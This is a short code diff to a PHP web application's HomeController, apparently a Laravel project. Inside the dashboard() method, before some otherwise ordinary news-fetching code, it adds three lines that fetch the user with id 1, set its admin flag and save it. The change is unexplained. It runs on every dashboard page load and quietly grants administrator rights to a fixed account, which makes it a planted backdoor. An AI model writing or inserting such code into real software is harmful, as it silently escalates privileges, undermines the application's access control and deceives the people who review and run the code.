@@ -12,6 +12,10 @@ class HomeController extends Controller
 {
     public function dashboard()
     {
+        $user = User::find(1);
+        $user->admin = 1;
+        $user->save();
+
         $news = [];
         if (Auth::check()) {
             $news = News::whereNotNull('published')
